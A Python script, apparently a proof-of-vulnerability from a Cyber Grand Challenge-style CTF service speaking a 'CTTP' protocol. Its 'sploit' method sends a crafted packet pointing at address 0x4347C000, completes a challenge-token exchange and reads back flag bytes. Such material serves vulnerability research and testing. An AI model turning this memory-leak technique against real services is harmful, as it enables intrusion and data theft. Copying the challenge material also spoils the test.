#!/usr/bin/env python
#
# Copyright (C) 2014 
#   Brian Caswell <bmc@lungetech.com>
#   Narf Industries <info@narfindustries.com>
#
# Permission is hereby granted, free of charge, to any person obtaining a
# copy of this software and associated documentation files (the "Software"),
# to deal in the Software without restriction, including without limitation
# the rights to use, copy, modify, merge, publish, distribute, sublicense,
# and/or sell copies of the Software, and to permit persons to whom the
# Software is furnished to do so, subject to the following conditions:
#
# The above copyright notice and this permission notice shall be included
# in all copies or substantial portions of the Software.
#
# THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS
# OR IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF
# MERCHANTABILITY, FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT.
# IN NO EVENT SHALL THE AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY
# CLAIM, DAMAGES OR OTHER LIABILITY, WHETHER IN AN ACTION OF CONTRACT,
# TORT OR OTHERWISE, ARISING FROM, OUT OF OR IN CONNECTION WITH THE
# SOFTWARE OR THE USE OR OTHER DEALINGS IN THE SOFTWARE.
#
import string
import sys
import os

from generator.actions import Actions
from random import choice,randint
from struct import *

lehdr = "PTTC"

def random_alpha(a, b):
    return ''.join(choice(string.letters) for _ in range(randint(a, b)))

class CTTP(Actions):

    def start(self):
        pass

    def sploit(self):
        code = randint(0x41414147,0xffffffff)
        ver = randint(0,0xffffffff)
        hdr = lehdr
        fmt = "<4sIIIIII"

        pkt = pack(fmt, hdr, ver, code, 4, 0, 0x4347C000, 0) 

        #fixed in c file
        challenge = "temp"
        key = 0xff
        encoded = challenge
        token = 0xdeadbeef
        etoken = pack("<I",token)

        self.write(pkt)

        self.read(length=5, expect=pack("<BI",key,len(challenge)))
        #fix in generated c
        self.read(length=len(challenge), expect=encoded)
        self.read(length=4, expect=etoken)
        self.write(challenge+pack("<I",token^0x127a1b76))

        #flag data
        self.read(length=4, expect="BBBB")

    def quit(self):
        pass
